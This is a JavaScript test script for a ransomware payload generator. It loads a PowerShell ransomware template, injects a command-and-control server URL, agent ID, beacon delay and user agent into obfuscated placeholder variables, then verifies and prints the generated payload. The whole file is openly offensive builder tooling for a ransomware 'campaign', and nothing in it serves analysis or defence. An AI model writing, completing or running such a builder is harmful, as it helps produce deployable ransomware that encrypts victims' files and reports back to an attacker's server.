const path = require('path');
const fs = require('fs').promises;

// Import our payload generation function
// Since we can't directly import the function from the router file,
// we'll recreate the logic here for testing

// Template path for the ransomware PowerShell script
const TEMPLATE_PATH = path.join(__dirname, 'templates/ransomware/template.ps1');

/**
 * Generate a ransomware payload based on campaign configuration
 * @param {Object} config - Campaign configuration from frontend
 * @returns {string} Generated PowerShell script
 */
async function generateRansomwarePayload(config) {
  try {
    // Read the template file
    let template = await fs.readFile(TEMPLATE_PATH, 'utf8');
    
    // Generate a unique agent ID if not provided
    const agentId = config.agentId || 'test-agent-id';
    
    // Replace placeholders in the template
    template = template.replace(/\$xzvcv = \$null/g, `$xzvcv = "${config.c2Server || 'http://localhost:8080'}"`);
    template = template.replace(/\$cxzvz = \$null/g, `$cxzvz = "${agentId}"`);
    template = template.replace(/\$vczxv = 0/g, `$vczxv = ${config.delay || 30}`);
    
    // Handle user agent if provided
    if (config.userAgent) {
      template = template.replace(/\$zxcvx = \$null/g, `$zxcvx = "${config.userAgent}"`);
    }
    
    // Add any additional configuration parameters here
    // For example, ransom note, file extensions, etc.
    
    return template;
  } catch (error) {
    throw new Error(`Failed to generate ransomware payload: ${error.message}`);
  }
}

async function testPayloadGeneration() {
  try {
    console.log('Testing ransomware payload generation...');
    
    // Test configuration
    const testConfig = {
      mode: 'fire_forget',
      payloadType: 'ps1',
      c2Server: 'http://test-server:8080',
      delay: 45,
      userAgent: 'Test-Agent/1.0',
      agentId: 'test-123'
    };
    
    // Generate payload
    const payload = await generateRansomwarePayload(testConfig);
    
    console.log('SUCCESS: Payload generated');
    console.log('Payload size:', payload.length, 'characters');
    
    // Check if replacements were made
    if (payload.includes('http://test-server:8080')) {
      console.log('SUCCESS: C2 server URL replaced correctly');
    } else {
      console.log('ERROR: C2 server URL not replaced');
    }
    
    if (payload.includes('test-123')) {
      console.log('SUCCESS: Agent ID replaced correctly');
    } else {
      console.log('ERROR: Agent ID not replaced');
    }
    
    if (payload.includes('$vczxv = 45')) {
      console.log('SUCCESS: Delay value replaced correctly');
    } else {
      console.log('ERROR: Delay value not replaced');
    }
    
    // Show first 1000 characters of the modified payload
    console.log('\nFirst 1000 characters of generated payload:');
    console.log(payload.substring(0, 1000));
    
  } catch (error) {
    console.error('Test failed with error:', error);
  }
}

testPayloadGeneration();
